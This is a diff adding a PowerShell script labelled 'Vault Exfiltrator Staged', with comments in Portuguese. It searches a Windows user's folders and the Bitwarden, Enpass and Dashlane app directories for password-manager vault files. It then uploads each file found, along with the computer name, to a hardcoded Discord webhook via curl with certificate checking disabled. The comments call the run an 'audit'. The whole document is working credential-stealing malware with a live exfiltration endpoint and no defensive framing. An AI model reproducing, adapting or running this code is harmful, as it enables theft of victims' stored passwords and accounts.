@@ -1,0 +1,31 @@
+# PAYLOAD (.ps1) - Vault Exfiltrator Staged
+$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
+
+# Alvos: Extensões e caminhos de gestores de passwords identificados
+$e = @('*.kdbx', 'data.json', '*.opvault', '*.1pux', '*.enpassdb', '*.dashlane')
+
+# Caminhos específicos baseados no script original
+$paths = @(
+    "$env:USERPROFILE\Documents",
+    "$env:APPDATA\Bitwarden",
+    "$env:USERPROFILE",
+    "$env:APPDATA\Sinew Software Systems Pvt Ltd\Enpass",
+    "$env:LOCALAPPDATA\Packages\SinewSoftwareSystems.EnpassPasswordManager_fwdy0m65qb6h2\LocalState",
+    "$env:APPDATA\Dashlane"
+)
+
+# Notificação de Início
+curl.exe -k -s -F ('payload=' + [char]64 + 'Auditoria de Vaults iniciada: ' + $env:COMPUTERNAME) $u
+
+foreach ($p in $paths) {
+    if (Test-Path $p) {
+        Get-ChildItem -Path $p -Include $e -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+            if ($_.Length -lt 24MB) {
+                $a = 'file=' + [char]64 + $_.FullName
+                curl.exe -k -s -F $a -F "content=Vault Detetado: $($_.Name)" $u
+            }
+        }
+    }
+}
+
+exit
